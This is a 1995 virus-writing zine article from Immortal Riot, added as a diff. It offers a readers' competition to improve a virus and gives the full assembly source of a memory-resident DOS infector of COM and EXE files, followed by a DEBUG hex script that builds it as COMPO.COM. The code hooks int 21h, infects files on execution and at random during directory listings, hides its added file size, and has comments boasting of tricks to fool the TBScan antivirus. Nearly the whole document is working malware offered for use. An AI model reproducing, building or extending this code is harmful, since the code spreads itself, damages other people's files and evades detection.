@@ -1,0 +1,1269 @@
+Insane Reality issue #7 - (c)opyright 1995 Immortal Riot               File 014 
+
+
+% IR-competition %
+
+-------------------
+
+Here's a source code to a memory resident infector of COM and EXE 
+programs executed or touched with the functions 11/12h (i.e. it infects 
+on DIR's, but does it only on random basis). It lack a lot of things that 
+we would like you to add :).
+
+
+
+If you feel like competing with other "code-hackers", get in touch 
+with me, and make sure I get your contribution :).
+
+
+
+I am very well aware that this is a stupid idea :-), but atleast the 
+virus works alright :) and some might even learn something from it.. 
+
+
+- The Unforgiven.
+
+
+
+% You-name-the-bitch %
+
+----------------------
+
+.model tiny
+
+.code
+
+ org 100h
+
+
+
+pagesize        equ     (((offset last) - (offset start)) shr 9) + 1 
+parasize        equ     (((offset last) - (offset start)) shr 4) + 1 
+bytesize        equ     (parasize shl 4)
+
+lastpage        equ     bytesize - (pagesize shl 9)
+
+
+
+start:
+
+        push    ds
+
+        call    install
+
+entry:
+
+        jmp     restore
+
+
+
+; Information about host program
+
+
+
+orgip   dw      020CDh                  ; Entry point if .exe, 
+orgcs   dw      0                       ; if .com first 3 bytes of file. 
+com     db      0FFh                    ; If .exe com=0 if .com com=FF 
+
+
+install:
+
+        ; Check if already resident
+
+        mov     ah, 30h                 ; Get dos version
+
+        mov     bx, 1009                ; Installation check 
+        int     21h
+
+        cmp     bx, 9001                ; Is installed?
+
+        jne     gores
+
+        mov     bp, sp                  ; Get delta offset 
+        mov     bp, ss:[bp]
+
+        ret
+
+
+
+org21:
+
+        db      0EAh                    ; Buffer for original int21 
+org21o  dw      ?
+
+org21s  dw      ?
+
+
+
+gores:
+
+        pop     bp
+
+        cmp     al, 03h                 ; Check dos version 
+        jb      restore
+
+
+
+        ; Try to allocate memory
+
+memall: mov     ah, 48h                 ; Allocate memory
+
+        mov     bx, parasize+3
+
+        int     21h
+
+        jnc     gohigh
+
+
+
+        ; Try to decrease host memory
+
+        push    es                      ; Get MCB
+
+        mov     bx, es
+
+        dec     bx
+
+        mov     es, bx
+
+        mov     bx, es:[03h]            ; Get size of memory 
+        sub     bx, parasize+4          ; Calculate needed memory 
+        pop     es
+
+        mov     ah, 4Ah                 ; Decrease memory block 
+        int     21h
+
+        jnc     memall                  ; Allocate memory for virus 
+        jmp     restore
+
+
+
+gohigh:
+
+        ; Move virus to new memory
+
+        dec     ax                      ; es to new mcb
+
+        mov     es, ax
+
+        mov     word ptr es:[1], 8      ; mark dos as owner 
+        mov     di, 10h                 ; Set es:di to new block 
+        push    cs                      ; Set ds:si to virus code 
+        pop     ds
+
+        mov     si, bp
+
+        sub     si, 4                   ; Adjust for first call 
+        mov     cx, bytesize
+
+        cld
+
+        rep     movsb
+
+
+
+        ; Install in int21 vector
+
+        sub     ax, 0Fh                 ; Adjust for org 100h 
+        mov     ds, ax
+
+        mov     ax, 3521h               ; Save int21 vector 
+        int     21h
+
+        mov     org21o, bx
+
+        mov     org21s, es
+
+        mov     ah, 25h                 ; Set int21 vector 
+        mov     dx, offset vector21
+
+        int     21h
+
+
+
+restore:
+
+        ; Restore original program
+
+        pop     es
+
+        push    es
+
+        cmp     byte ptr cs:bp[6], 00h           ; Check file type 
+        je      restexe
+
+
+
+        ; Restore .com program
+
+        push    es
+
+        pop     ds
+
+        mov     di, 100h
+
+        push    di
+
+        mov     ax, cs:bp[2]
+
+        stosw
+
+        mov     al, cs:bp[4]
+
+        stosb
+
+        retf
+
+
+
+restexe:
+
+        ; Restore .exe program
+
+        pop     ax
+
+        mov     ds, ax
+
+        add     ax, cs:bp[4]            ; relocate cs
+
+        add     ax, 10h
+
+        push    ax
+
+        mov     ax, cs:bp[2]            ; get ip
+
+        push    ax
+
+        retf                            ; Jump to host
+
+
+
+vector21:
+
+        cmp     ah, 30h                 ; Get dos version? 
+        jne     chkexe
+
+        cmp     bx, 1009                ; Installation check? 
+        jne     chkexe
+
+        call    dos
+
+        mov     bx, 9001                ; Return residency code 
+        retf    2
+
+chkexe:
+
+        cmp     ax, 4B00h               ; Load and execute? 
+        jne     chkfcb
+
+        call    infect                  ; Infect file
+
+        jmp     chnexit
+
+chkfcb:
+
+        cmp     ah, 11h                 ; Find file?
+
+        je      fcb
+
+        cmp     ah, 12h                 ; Find file?
+
+        je      fcb
+
+
+
+        cmp     ah, 4Eh                 ; Find handle?
+
+        je      fhdl
+
+        cmp     ah, 4Fh                 ; Find handle?
+
+        jne     chnexit
+
+fhdl:   call    dos
+
+        jnc     fhdls
+
+        retf    2
+
+fhdls:  jmp     findhandle
+
+
+
+chnexit:
+
+        jmp     org21
+
+
+
+fcb:
+
+; Called on find first/find next fcb
+
+        ; Perform dos call
+
+
+
+        call    dos
+
+        or      al, al                  ; Check if a file was found 
+        jz      exist
+
+        retf    2
+
+exist:
+
+        push    ax
+
+        push    bx
+
+        push    cx
+
+        push    dx
+
+        push    si
+
+        push    di
+
+        push    ds
+
+        push    es
+
+
+
+        mov     ax, 6200h               ; Get psp
+
+        call    dos
+
+        mov     es, bx
+
+        cmp     bx, es:[16h]            ; Ensure that dos is calling 
+        jne     fcbexit
+
+
+
+        call    getdta                  ; Get address of fcb 
+        lodsb                           ; Check if extended 
+        cmp     al, 0FFh
+
+        jne     noext
+
+        add     si, 7
+
+noext:
+
+        mov     bx, si
+
+        add     si, 8                   ; Check extension
+
+        lodsw
+
+        push    ax
+
+
+
+        add     si, 0Ch                 ; Check for infection 
+        lodsb
+
+        and     al, 1Fh
+
+        cmp     al, 03h
+
+        pop     ax
+
+        pushf
+
+        add     si, 5
+
+
+
+        cmp     ax, 'OC'
+
+        je      fcbcom
+
+        cmp     ax, 'XE'
+
+        je      fcbexe
+
+        popf
+
+        jmp     fcbexit
+
+
+
+fcbcom:
+
+        ; Check for infection
+
+        popf
+
+        jne     fcbcomni
+
+        sub     word ptr [si], bytesize
+
+        jmp     fcbexit
+
+fcbcomni:
+
+        in      al, 41h                 ; Get timer (rnd)
+
+        test    al, 03h                 ; 25% infection
+
+        jne     fcbexit
+
+        call    cvtasciz                ; Convert to asciz 
+        mov     ax, 'C.'                ; Append exetnsion 
+        stosw
+
+        mov     ax, 'MO'
+
+        stosw
+
+        jmp     fcbinfect
+
+
+
+fcbexe:
+
+        ; Check for infection
+
+        popf
+
+        jne     fcbexeni
+
+        sub     word ptr [si], bytesize
+
+        jmp     fcbexit
+
+fcbexeni:
+
+        in      al, 41h                 ; Get timer (rnd)
+
+        test    al, 03h                 ; 25% infection
+
+        jne     fcbexit
+
+        call    cvtasciz
+
+        mov     ax, 'E.'
+
+        stosw
+
+        mov     ax, 'EX'
+
+        stosw
+
+
+
+fcbinfect:
+
+        xor     al, al
+
+        stosb
+
+        mov     dx, offset last
+
+        push    cs
+
+        pop     ds
+
+        call    infect
+
+
+
+fcbexit:
+
+        pop     es
+
+        pop     ds
+
+        pop     di
+
+        pop     si
+
+        pop     dx
+
+        pop     cx
+
+        pop     bx
+
+        pop     ax
+
+        retf    2
+
+
+
+cvtasciz        proc
+
+        push    cs                      ; Convert to asciz 
+        pop     es
+
+        mov     si, bx
+
+        mov     di, offset last
+
+        mov     cx, 8
+
+loop3:  lodsb
+
+        cmp     al, ' '
+
+        je      loopx
+
+        stosb
+
+        loop    loop3
+
+loopx:  ret
+
+cvtasciz        endp
+
+
+
+infect  proc
+
+; Called on load and execute
+
+        push    ax
+
+        push    bx
+
+        push    cx
+
+        push    dx
+
+        push    si
+
+        push    di
+
+        push    ds
+
+        push    es
+
+
+
+        mov     ax, 3D82h               ; Open victim
+
+        call    dos
+
+        jc      exitinfect
+
+        xchg    ax, bx
+
+
+
+        mov     ax, 5700h               ; Save file date/time 
+        call    dos
+
+        push    dx
+
+        push    cx
+
+
+
+        mov     ah, 3Fh                 ; Read first bytes 
+        push    cs
+
+        pop     ds
+
+        lea     dx, orgip
+
+        mov     cx, 2
+
+        call    dos
+
+        xor     orgip, 4523h            ; Check if .exe file 
+        cmp     orgip, 'MZ' xor 4523h   ; TBScan fooled again... 
+        je      infectexe
+
+        cmp     orgip, 'ZM' xor 4523h
+
+        je      infectexe
+
+        xor     orgip, 4523h
+
+        jmp     infectcom
+
+
+
+infectdone:
+
+        pop     cx                      ; Restore date/time of file 
+        pop     dx
+
+        mov     ax, 5701h
+
+        call    dos
+
+
+
+        mov     ah, 3Eh                 ; Close file
+
+        call    dos
+
+exitinfect:
+
+        pop     es
+
+        pop     ds
+
+        pop     di
+
+        pop     si
+
+        pop     dx
+
+        pop     cx
+
+        pop     bx
+
+        pop     ax
+
+        ret
+
+infect  endp
+
+
+
+infectexe:
+
+        ; Read header from .exe file
+
+        mov     ah, 3Fh
+
+        lea     dx, last                        ; Use memory above virus 
+        mov     cx, 16h
+
+        call    dos
+
+
+
+        ; Calculate address of entrypoint
+
+        mov     ax, word ptr last[entryseg]     ; Get entry cs value 
+        add     ax, word ptr last[headsize]     ; Get header size 
+        mov     cx, 10h                         ; Convert to bytes 
+        mul     cx
+
+        add     ax, word ptr last[entryofs]     ; add ip offset 
+        adc     dx, 00
+
+
+
+        ; Seek to entrypoint
+
+        mov     cx, dx
+
+        xchg    dx, ax
+
+        mov     ax, 4200h
+
+        call    dos
+
+
+
+        ; Check if already infected
+
+        mov     ah, 3Fh                         ; Read bytes at entry 
+        mov     cx, 4h
+
+        lea     dx, orgip
+
+        mov     si, dx
+
+        call    dos
+
+
+
+        lodsw                                   ; Compare entry to virus 
+        cmp     ax, word ptr start
+
+        jne     exenotinf
+
+        lodsw
+
+        cmp     ax, word ptr start[2]
+
+        je      infectdone
+
+
+
+exenotinf:
+
+        ; Mark infection
+
+        pop     ax                              ; Get time stamp 
+        and     al, 0E0h                        ; Mask seconds 
+        or      al, 003h                        ; Set seconds to 6 
+        push    ax
+
+
+
+        ; Infect file
+
+        lea     si, last[entryofs]              ; Save program information 
+        lodsw
+
+        mov     orgip, ax
+
+        lodsw
+
+        mov     orgcs, ax
+
+        mov     cs:com, 0                       ; This is .exe 
+
+
+        ; Calculate virus entry
+
+        mov     ax, 4202h                       ; Seek to eof 
+        xor     cx, cx
+
+        cwd
+
+        call    dos
+
+
+
+        xchg    ax, dx                          ; eof pos in ax:dx 
+        mov     cl, 12
+
+        shl     ax, cl
+
+        mov     word ptr last[entryseg], ax
+
+        xchg    ax, dx
+
+        xor     dx, dx
+
+        mov     cx, 10h                         ; Convert eof pos to paras 
+        div     cx
+
+        sub     ax, word ptr last[headsize]     ; Calculate entry for virus 
+        add     word ptr last[entryseg], ax     ; Save in header 
+        mov     word ptr last[entryofs], dx
+
+
+
+        ; Recalculate size
+
+        mov     ax, word ptr last[lastsize]
+
+        add     ax, bytesize
+
+        cwd
+
+        mov     cx, 200h
+
+        div     cx
+
+        mov     word ptr last[lastsize], dx
+
+        add     word ptr last[pages], ax
+
+
+
+        mov     ah, 3Fh                         ; Append virus 
+        mov     dx, 100h
+
+        mov     cx, bytesize
+
+        inc     ah                              ; TB-Moron(tm) 
+        push    ax
+
+        call    dos
+
+
+
+        ; Save modified exe-header
+
+        mov     ax, 4200h                       ; Seek to header 
+        xor     cx, cx
+
+        mov     dx, 2
+
+        call    dos
+
+
+
+        pop     ax
+
+        lea     dx, last                        ; Write header 
+        mov     cx, 16h
+
+        call    dos
+
+
+
+        jmp     infectdone
+
+
+
+infectcom:
+
+        ; Installation check
+
+        call    ichkcom
+
+        jnc     comnotinf
+
+        jmp     infectdone
+
+
+
+comnotinf:
+
+
+
+        ; Mark infection
+
+        pop     ax                              ; Get time stamp 
+        and     al, 0E0h                        ; Mask seconds 
+        or      al, 003h                        ; Set seconds to 6 
+        push    ax
+
+
+
+        mov     com, 0FFh
+
+
+
+        ; Seek to eof
+
+        mov     ax, 4202h
+
+        xor     cx, cx
+
+        cwd
+
+        call    dos
+
+
+
+        ; Create jump opcode
+
+        sub     ax, 3
+
+        mov     word ptr last, ax
+
+
+
+        ; Append virus
+
+        mov     ah, 3Fh
+
+        mov     cx, bytesize
+
+        mov     dx, 100h
+
+        inc     ah                              ; TB...
+
+        push    ax
+
+        call    dos
+
+
+
+        ; Write jump to beginning of file
+
+        mov     ax, 4200h
+
+        xor     cx, cx
+
+        cwd
+
+        call    dos
+
+        pop     ax                              ; TB...
+
+        mov     cx, 3
+
+        lea     dx, jumpop
+
+        call    dos
+
+
+
+        jmp     infectdone
+
+
+
+findhandle:
+
+        pushf
+
+        push    ax
+
+        push    bx
+
+        push    cx
+
+        push    si
+
+        push    di
+
+        push    ds
+
+        push    es
+
+
+
+        call    getdta                  ; dta to es:si and ds:si 
+        mov     di, si
+
+
+
+        mov     al, si[16h]             ; Get seconds
+
+        and     al, 1Fh
+
+        cmp     al, 3
+
+        pushf
+
+
+
+        add     di, 1Eh                 ; di to name
+
+        mov     cx, 9
+
+        mov     al, '.'
+
+        repne   scasb                   ; scan for extension 
+        xchg    si, di
+
+        lodsw
+
+        cmp     ax, 'OC'                ; check if com?
+
+        je      hdlcom
+
+        cmp     ax, 'XE'
+
+        je      hdlexe
+
+        popf
+
+        jmp     hdlexit
+
+
+
+hdlcom:
+
+hdlexe:
+
+        popf
+
+        jne     hdlexit
+
+        sub     word ptr di[1Ah], bytesize
+
+        sbb     word ptr di[1Ch], 0
+
+
+
+hdlexit:
+
+        pop     es
+
+        pop     ds
+
+        pop     di
+
+        pop     si
+
+        pop     cx
+
+        pop     bx
+
+        pop     ax
+
+        popf
+
+        retf    2
+
+
+
+ichkcom proc
+
+; Checks if com-file with handle in bx is infected
+
+
+
+        mov     ax, 4200h               ; Seek to beginning 
+        xor     cx, cx
+
+        cwd
+
+        call    dos
+
+
+
+        push    ds
+
+
+
+        mov     ah, 3Fh                 ; Read first bytes 
+        mov     cl, 3
+
+        mov     dx, offset orgip
+
+        call    dos
+
+
+
+        cmp     byte ptr orgip, 0E9h    ; Check if jump
+
+        jne     icnotinf
+
+
+
+        mov     ax, 4201h               ; Seek to entry point 
+        xor     cx, cx
+
+        mov     dx, word ptr orgip[1]
+
+        call    dos
+
+
+
+        mov     cl, 4
+
+        call    readtolast              ; Get entry point
+
+        cmp     word ptr last, 0E81Eh
+
+        jne     icnotinf
+
+        cmp     word ptr last[2], 00007h
+
+        jne     icnotinf
+
+
+
+        pop     ds
+
+        stc                             ; Return with carry 
+        ret
+
+icnotinf:
+
+        pop     ds
+
+        clc                             ; Not infected
+
+        ret
+
+ichkcom         endp
+
+
+
+dos     proc
+
+        pushf
+
+        call    dword ptr cs:org21o
+
+        ret
+
+dos     endp
+
+
+
+getdta  proc
+
+        mov     ah, 2Fh                 ; Get dta
+
+        call    dos
+
+        push    es                      ; ds:si to dta
+
+        pop     ds
+
+        mov     si, bx
+
+        ret
+
+getdta  endp
+
+
+
+readtolast      proc
+
+        mov     ah, 3Fh
+
+        push    cs
+
+        pop     ds
+
+        mov     dx, offset last
+
+        call    dos
+
+        ret
+
+readtolast      endp
+
+
+
+jumpop  db      0E9h
+
+last:
+
+
+
+exehead struc
+
+        lastsize        dw      ?
+
+        pages           dw      ?
+
+        tblesize        dw      ?
+
+        headsize        dw      ?
+
+        minalloc        dw      ?
+
+        maxalloc        dw      ?
+
+        stackseg        dw      ?
+
+        stackofs        dw      ?
+
+        checksum        dw      ?
+
+        entryofs        dw      ?
+
+        entryseg        dw      ?
+
+exehead ends
+
+
+
+end     start
+
+==================================================================
+============== 
+N COMPO.COM
+
+E 0100 1E E8 07 00 EB 75 CD 20 00 00 FF B4 30 BB F1 03
+
+E 0110 CD 21 81 FB 29 23 75 0B 8B EC 8B 6E 00 C3 EA 00
+
+E 0120 00 00 00 5D 3C 03 72 53 B4 48 BB 3C 00 CD 21 73
+
+E 0130 17 06 8C C3 4B 8E C3 26 8B 1E 03 00 83 EB 3D 07
+
+E 0140 B4 4A CD 21 73 E2 EB 33 48 8E C0 26 C7 06 01 00
+
+E 0150 08 00 BF 10 00 0E 1F 8B F5 83 EE 04 B9 90 03 FC
+
+E 0160 F3 A4 2D 0F 00 8E D8 B8 21 35 CD 21 89 1E 1F 01
+
+E 0170 8C 06 21 01 B4 25 BA A6 01 CD 21 07 06 2E 80 7E
+
+E 0180 06 00 74 11 06 1F BF 00 01 57 2E 8B 46 02 AB 2E
+
+E 0190 8A 46 04 AA CB 58 8E D8 2E 03 46 04 05 10 00 50
+
+E 01A0 2E 8B 46 02 50 CB 80 FC 30 75 0F 81 FB F1 03 75
+
+E 01B0 09 E8 BE 02 BB 29 23 CA 02 00 3D 00 4B 75 05 E8
+
+E 01C0 D0 00 EB 1F 80 FC 11 74 1D 80 FC 12 74 18 80 FC
+
+E 01D0 4E 74 05 80 FC 4F 75 0B E8 97 02 73 03 CA 02 00
+
+E 01E0 E9 08 02 E9 38 FF E8 89 02 0A C0 74 03 CA 02 00
+
+E 01F0 50 53 51 52 56 57 1E 06 B8 00 62 E8 74 02 8E C3
+
+E 0200 26 3B 1E 16 00 75 6D E8 6F 02 AC 3C FF 75 03 83
+
+E 0210 C6 07 8B DE 83 C6 08 AD 50 83 C6 0C AC 24 1F 3C
+
+E 0220 03 58 9C 83 C6 05 3D 43 4F 74 08 3D 45 58 74 1F
+
+E 0230 9D EB 41 9D 75 06 81 2C 90 03 EB 38 E4 41 A8 03
+
+E 0240 75 32 E8 3A 00 B8 2E 43 AB B8 4F 4D AB EB 1A 9D
+
+E 0250 75 06 81 2C 90 03 EB 1C E4 41 A8 03 75 16 E8 1E
+
+E 0260 00 B8 2E 45 AB B8 58 45 AB 32 C0 AA BA 8F 04 0E
+
+E 0270 1F E8 1E 00 07 1F 5F 5E 5A 59 5B 58 CA 02 00 0E
+
+E 0280 07 8B F3 BF 8F 04 B9 08 00 AC 3C 20 74 03 AA E2
+
+E 0290 F8 C3 50 53 51 52 56 57 1E 06 B8 82 3D E8 D2 01
+
+E 02A0 72 42 93 B8 00 57 E8 C9 01 52 51 B4 3F 0E 1F BA
+
+E 02B0 06 01 B9 02 00 E8 BA 01 81 36 06 01 23 45 81 3E
+
+E 02C0 06 01 79 08 74 27 81 3E 06 01 6E 1F 74 1F 81 36
+
+E 02D0 06 01 23 45 E9 CE 00 59 5A B8 01 57 E8 93 01 B4
+
+E 02E0 3E E8 8E 01 07 1F 5F 5E 5A 59 5B 58 C3 B4 3F BA
+
+E 02F0 8F 04 B9 16 00 E8 7A 01 A1 A3 04 03 06 95 04 B9
+
+E 0300 10 00 F7 E1 03 06 A1 04 83 D2 00 8B CA 92 B8 00
+
+E 0310 42 E8 5E 01 B4 3F B9 04 00 BA 06 01 8B F2 E8 51
+
+E 0320 01 AD 3B 06 00 01 75 07 AD 3B 06 02 01 74 A8 58
+
+E 0330 24 E0 0C 03 50 BE A1 04 AD A3 06 01 AD A3 08 01
+
+E 0340 2E C6 06 0A 01 00 B8 02 42 33 C9 99 E8 23 01 92
+
+E 0350 B1 0C D3 E0 A3 A3 04 92 33 D2 B9 10 00 F7 F1 2B
+
+E 0360 06 95 04 01 06 A3 04 89 16 A1 04 A1 8F 04 05 90
+
+E 0370 03 99 B9 00 02 F7 F1 89 16 8F 04 01 06 91 04 B4
+
+E 0380 3F BA 00 01 B9 90 03 FE C4 50 E8 E5 00 B8 00 42
+
+E 0390 33 C9 BA 02 00 E8 DA 00 58 BA 8F 04 B9 16 00 E8
+
+E 03A0 D0 00 E9 32 FF E8 89 00 73 03 E9 2A FF 58 24 E0
+
+E 03B0 0C 03 50 C6 06 0A 01 FF B8 02 42 33 C9 99 E8 B1
+
+E 03C0 00 2D 03 00 A3 8F 04 B4 3F B9 90 03 BA 00 01 FE
+
+E 03D0 C4 50 E8 9D 00 B8 00 42 33 C9 99 E8 94 00 58 B9
+
+E 03E0 03 00 BA 8E 04 E8 8A 00 E9 EC FE 9C 50 53 51 56
+
+E 03F0 57 1E 06 E8 83 00 8B FE 8A 44 16 24 1F 3C 03 9C
+
+E 0400 83 C7 1E B9 09 00 B0 2E F2 AE 87 F7 AD 3D 43 4F
+
+E 0410 74 08 3D 45 58 74 03 9D EB 0C 9D 75 09 81 6D 1A
+
+E 0420 90 03 83 5D 1C 00 07 1F 5F 5E 59 5B 58 9D CA 02
+
+E 0430 00 B8 00 42 33 C9 99 E8 38 00 1E B4 3F B1 03 BA
+
+E 0440 06 01 E8 2D 00 80 3E 06 01 E9 75 23 B8 01 42 33
+
+E 0450 C9 8B 16 07 01 E8 1A 00 B1 04 E8 26 00 81 3E 8F
+
+E 0460 04 1E E8 75 0A 83 3E 91 04 07 75 03 1F F9 C3 1F
+
+E 0470 F8 C3 9C 2E FF 1E 1F 01 C3 B4 2F E8 F4 FF 06 1F
+
+E 0480 8B F3 C3 B4 3F 0E 1F BA 8F 04 E8 E5 FF C3 E9
+
+RCX
+
+038F
+
+W
+
+Q
+
